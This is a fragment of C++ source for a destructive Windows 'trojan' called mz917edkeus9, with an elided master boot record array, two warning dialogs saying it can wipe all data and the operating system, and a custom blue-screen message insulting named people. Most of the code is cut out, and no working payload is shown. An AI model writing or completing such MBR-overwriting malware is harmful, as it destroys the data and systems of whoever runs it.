// mz917edkeus9.cpp : Defines the entry point for the application.
//
...
const unsigned char MasterBootRecord[] = {
	,
...
{
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as mz917edkeus9 that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator (Underwater Tiny Kong & DareenYounes) will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"mz917edkeus9.exe (noskid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator (Underwater Tiny Kong & DareenYounes) will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"mz917edkeus9.exe (noskid)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			...
			ULONG_PTR args[] = { (ULONG_PTR)"No Skid, No Stolen GDI, No Stolen Bytebeat, Hate TrisodiumPhospate, UltraDasher965 and N17Pro3426 NOW!, Stop Saying Skidded malware" }; //Custom BSOD yay!
